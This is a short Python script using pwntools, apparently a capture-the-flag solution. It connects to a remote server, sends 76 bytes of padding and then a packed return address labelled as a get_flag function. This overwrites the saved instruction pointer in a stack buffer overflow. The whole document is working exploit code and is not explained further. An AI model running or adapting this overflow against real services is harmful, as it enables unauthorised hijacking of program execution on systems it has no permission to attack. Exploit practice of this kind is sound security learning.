from  pwn import *
import struct

s=remote("jh2i.com", 50039)     #connect to remote server
junk="A" * 76                   # junk to modify EIP
vuln=struct.pack("I",0x80484f6) #0x80484f6 get_flag address
a=  junk + vuln
s.send(a)
